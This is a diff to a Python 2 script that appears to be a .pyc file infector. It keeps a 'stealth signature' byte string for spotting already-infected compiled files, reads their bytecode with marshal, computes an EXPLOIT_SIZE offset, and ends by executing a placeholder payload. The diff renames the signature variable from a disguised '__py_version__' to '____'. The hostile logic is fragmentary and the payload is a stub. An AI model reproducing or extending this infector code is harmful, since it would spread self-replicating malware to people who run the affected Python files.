@@ -1,4 +1,4 @@
-__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
+____ = "\xFF\xFE\x0A\x20\xCA\xDD"  # stealth signature
 # -*- coding: utf-8 -*-
 import socket
 import marshal
@@ -58,7 +58,7 @@ if __file__.endswith('.pyc'):
 
     EXPLOIT_SIZE = None
     for i in xrange(2, len(data.code)):
-        if type(data.code[i][1]) == type('') and data.code[i][1] == __py_version__: #signature
+        if type(data.code[i][1]) == type('') and data.code[i][1] == ____:  # signature
             EXPLOIT_SIZE = i + 2
             break
             #if not EXPLOIT_SIZE:
@@ -76,7 +76,7 @@ if __file__.endswith('.pyc'):
         head = f.read(8)
 
         data = Code.from_code(marshal.loads(f.read()))
-        if data.code[1][1] == __py_version__: #signature
+        if data.code[1][1] == ____:  # signature
             return
 
         f.close()
@@ -99,4 +99,4 @@ if __file__.endswith('.pyc'):
 
     exec "__PAYLOAD_PY__"
 
-__py_version__ = "\xFF\xFE\x0A\x20\xCA\xDD" # haha bullshit, this is a stealth signature
+____ = "\xFF\xFE\x0A\x20\xCA\xDD"  # this is a stealth signature
